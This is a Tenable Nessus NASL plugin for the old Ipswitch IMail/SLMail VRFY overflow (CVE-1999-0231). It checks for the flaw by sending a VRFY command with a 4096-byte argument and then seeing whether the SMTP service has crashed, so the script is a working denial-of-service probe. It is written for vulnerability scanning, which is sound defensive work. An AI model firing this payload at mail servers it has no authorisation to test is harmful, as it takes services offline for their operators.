#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
  script_id(10254);
  script_version ("$Revision: 1.32 $");

  script_cve_id("CVE-1999-0231");
  script_osvdb_id(5969, 6116);

  script_name(english:"Ipswitch IMail / SLMail VRFY Command Remote Overflow");
  script_summary(english:"VRFY aaaaa(...)aaa crashes the remote MTA");

  script_set_attribute(
    attribute:'synopsis',
    value:"The remote mail server is vulnerable to denial of service."
  );

  script_set_attribute(
    attribute:'description',
    value:
"It was possible to crash the affected SMTP service by sending a VRFY
command with a long argument. 

This attack is known to affect certain versions of Ipswitch IMail and
Seattle Labs' SLMail, although products from other vendors may also be
affected. 

An unauthenticated, remote attacker can leverage this issue to conduct
a denial of service attack against the affected mail server."
  );
  script_set_attribute(
    attribute:'solution',
    value:"Contact the product's vendor for an update."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_attribute(
    attribute:'see_also',
    value:"http://seclists.org/bugtraq/1998/Mar/93"
  );
  script_set_attribute(
    attribute:'see_also',
    value:"http://seclists.org/bugtraq/1998/Mar/94"
  );
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/06/22");
 script_set_attribute(attribute:"vuln_publication_date", value: "1998/03/12");
 script_cvs_date("$Date: 2016/12/14 20:33:26 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:ipswitch:imail");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:seattle_lab_software:slmail_pro");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
  script_family(english:"SMTP problems");

  script_dependencie("find_service1.nasl", "smtpserver_detect.nasl", "sendmail_expn.nasl");
  script_require_ports("Services/smtp", 25);
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc:"smtp", default: 25, exit_on_fail: 1);
# Note that slmail is also vulnerable on port 27.
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(1);

data = strcat('VRFY ', crap(4096), '\r\n');
send(socket:soc, data:data);
close(soc);

if (service_is_dead(port: port) > 0)
  security_warning(port);
